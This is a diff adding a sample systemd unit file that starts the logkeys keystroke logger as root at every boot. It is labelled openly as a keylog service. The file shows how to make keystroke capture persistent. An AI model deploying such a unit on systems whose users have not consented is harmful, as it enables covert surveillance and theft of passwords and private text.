@@ -1,0 +1,14 @@
+# Sample file to copy to root systemd to start as a service on boot 
+
+[Unit]
+Description = Keylog service 
+Documentation = 
+
+[Service]
+Type = oneshot 
+User = root 
+RemainAfterExit = yes
+ExecStart = /usr/local/bin/logkeys --start 
+
+[Install]
+WantedBy = multi-user.target
